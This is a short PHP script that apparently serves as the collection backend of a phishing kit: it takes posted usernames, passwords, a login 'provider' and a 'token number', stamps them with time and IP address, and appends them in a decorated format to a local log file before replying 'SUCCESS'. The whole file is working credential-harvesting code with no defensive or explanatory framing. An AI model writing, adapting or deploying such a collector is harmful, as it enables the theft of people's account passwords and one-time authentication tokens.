<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $time     = $_POST['timestamp'] ?? date('Y-m-d H:i:s T');
    $ip       = $_POST['ip'] ?? $_SERVER['REMOTE_ADDR'];
    $provider = $_POST['provider'] ?? 'UNKNOWN';
    $username = $_POST['username'] ?? 'UNKNOWN';
    $password = $_POST['password'] ?? 'UNKNOWN';
    $token    = $_POST['token'] ?? 'NONE';

    $log_entry = sprintf(
        "============================================================\n" .
        "⏰ TIMESTAMP     : %s\n" .
        "🌐 IP ADDRESS    : %s\n" .
        "🔑 PROVIDER      : %s\n" .
        "👤 USERNAME      : %s\n" .
        "🔒 PASSWORD      : %s\n" .
        "🎟️ TOKEN NUMBER  : %s\n" .
        "============================================================\n\n",
        $time, $ip, strtoupper($provider), $username, $password, $token
    );

    file_put_contents('local_log.txt', $log_entry, FILE_APPEND);
    echo "SUCCESS";
}
?>
